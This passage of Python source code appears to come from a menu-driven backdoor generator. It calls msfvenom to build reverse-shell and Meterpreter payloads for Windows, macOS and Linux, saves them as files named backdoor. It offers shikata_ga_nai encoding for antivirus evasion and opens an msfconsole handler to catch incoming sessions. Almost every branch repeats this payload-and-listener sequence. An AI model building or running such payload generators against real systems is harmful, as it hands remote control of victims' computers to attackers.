                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()                    
                               
                elif winp == "6":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/meterpreter_reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/meterpreter_reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()                
                           
                elif winp == "7":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/meterpreter_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/meterpreter_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()          
                else:
                    begining.slowprints1(begining.red + "[!] Wrong choice" + begining.end)
                    begining.slowprints1( begining.white + "[*] Please chose avaiable number" + begining.end)
                    begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                    sleep(2)
                    begining.menu()
                    work.works()
                   
                           
            elif paylo == "2":
                print("""
[1] > osx/ppc/shell_reverse_tcp
[2] > osx/ppc/shell/reverse_tcp
[3] > osx/x64/meterpreter/reverse_tcp
[4] > osx/x64/meterpreter_reverse_http
[5] > osx/x64/meterpreter_reverse_https
[6] > osx/x64/meterpreter_reverse_tcp
[7] > osx/armle/execute/reverse_tcp
[8] > osx/armle/shell/reverse_tcp
[9] > osx/armle/shell_reverse_tcp
""")            
                osx1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if osx1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform osx -f macho -p osx/ppc/shell_reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "osx/ppc/shell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()      
                elif osx1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform osx -f macho -p osx/ppc/shell/reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "osx/ppc/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()  
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif osx1 == "3":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "osx/x64/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()      
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif osx1 == "4":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "osx/x64/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()                    
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif osx1 == "5":
                     bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                     bassl = "yEs"
                     x = bassl.upper()
                     y = bassl.swapcase()
                     if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                         begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                         begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                         begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                         os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                         begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                         begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                         begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                         Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                         if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON": 
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[\u2713] ALL DONE")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.ext()
                         else:                         
                             cat = "osx/x64/meterpreter_reverse_https"
                             os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[\u2713] ALL DONE")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.ext()
                     else:
                         begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                         begining.ext()
                elif osx1 == "6":
                         bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                         bassl = "yEs"
                         x = bassl.upper()
                         y = bassl.swapcase()
                         if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                             if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON": 
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                             else:                         
                                 cat = "osx/x64/meterpreter_reverse_tcp"
                                 os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                         else:
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.ext()  
                elif osx1 == "7":
                         bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                         bassl = "yEs"
                         x = bassl.upper()
                         y = bassl.swapcase()
                         if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             os.system("sudo msfvenom --platform osx -f macho -p osx/armle/execute/reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                             if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON": 
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                             else:                         
                                 cat = "osx/armle/execute/reverse_tcp"
                                 os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                         else:
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.ext()  
                elif osx1 == "8":
                         bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                         bassl = "yEs"
                         x = bassl.upper()
                         y = bassl.swapcase()
                         if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :     
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             os.system("sudo msfvenom --platform osx -f macho -p osx/armle/shell/reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                             if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                             else:                         
                                 cat = "osx/armle/shell/reverse_tcp"
                                 os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                         else:
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.ext()  
                elif osx1 == "9":
                         bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                         bassl = "yEs"
                         x = bassl.upper()
                         y = bassl.swapcase()
                         if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             os.system("sudo msfvenom --platform osx -f macho -p osx/armle/shell_reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                             if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON": 
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()
                             else:                         
                                 cat = "osx/armle/shell_reverse_tcp"
                                 os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.slowprints2("[\u2713] ALL DONE")
                                 begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                                 begining.ext()  
                         else:
                             begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                             begining.ext()        
                else:
                    begining.slowprints1(begining.red + "[!] Wrong choice" + begining.end)
                    begining.slowprints1( begining.white + "[*] Please chose avaiable number" + begining.end)
                    begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                    sleep(2)
                    begining.menu()
                    work.works()
            elif paylo == "3":
                print("""
[1] > linux/x86/shell/reverse_tcp
[2] > linux/x86/meterpreter_reverse_http
[3] > linux/x86/meterpreter_reverse_https
[4] > linux/x86/meterpreter_reverse_tcp
[5] > linux/x64/shell/reverse_tcp
[6] > linux/x64/meterpreter_reverse_http
[7] > linux/x64/meterpreter_reverse_https
[8] > linux/x64/meterpreter_reverse_tcp
""")            
                linx1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if linx1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x86/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()      
               
                elif linx1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
